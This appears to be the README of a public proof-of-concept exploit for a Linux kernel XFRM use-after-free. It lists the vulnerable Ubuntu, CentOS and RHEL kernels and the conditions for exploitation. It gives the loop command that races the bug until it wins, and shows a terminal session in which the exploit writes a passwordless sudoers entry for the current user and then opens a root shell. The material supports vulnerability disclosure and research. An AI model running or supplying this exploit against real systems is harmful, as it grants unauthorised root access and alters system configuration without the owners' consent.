## Linux kernel 3.x - 5.x XFRM UAF PoC 

This is a poc for the [kernel
vulnerability](https://duasynt.com/blog/ubuntu-centos-redhat-privesc) that was
reported last year. CentOS was the last distribution to patch the bug in
January 2020.

The technical report is here https://duasynt.com/pub/vnik/01-0311-2018.pdf

Should work on all kernels with the build date before July - November 2019 on
the following distributions:

- Ubuntu 14.04 / 16.04 Server 4.4 LTS kernels
- CentOS 8 4.18 kernels
- Red Hat Enterprise Linux 8 4.18 kernels
- Ubuntu 18.04 Server LTS 4.15 kernels

Other distributions might be affected if:

- unprivileged usernamespaces are allowed
- xfrm support is compiled in or can be autoloaded
- the patch was not backported

It will probably take several tries to win the race (sometimes over 10
attempts), so run it in a loop just like it says:

```
$ while :; do ./lucky0 -q && break; done
```

On success, the current user is added to /etc/sudoers without a password.

```
[vnik@localhost ~]$ cat /etc/redhat-release 
CentOS Linux release 8.1.1911 (Core) 
[vnik@localhost ~]$ uname -a
Linux localhost.localdomain 4.18.0-80.11.2.el8_0.x86_64 #1 SMP Tue Sep 24 11:32:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
[vnik@localhost ~]$ while :; do ./lucky0 -q && break; done
[-] failed to win the race
[-] failed to win the race
[-] failed to win the race
[-] failed to win the race
[+] current user vnik was added to /etc/sudoers w/o a password. 'sudo -s' to get a shell
[vnik@localhost ~]$ sudo -s
[root@localhost vnik]# 
```

**On 4.4.x kernels it may trigger a null oops but it's fully recoverable.**
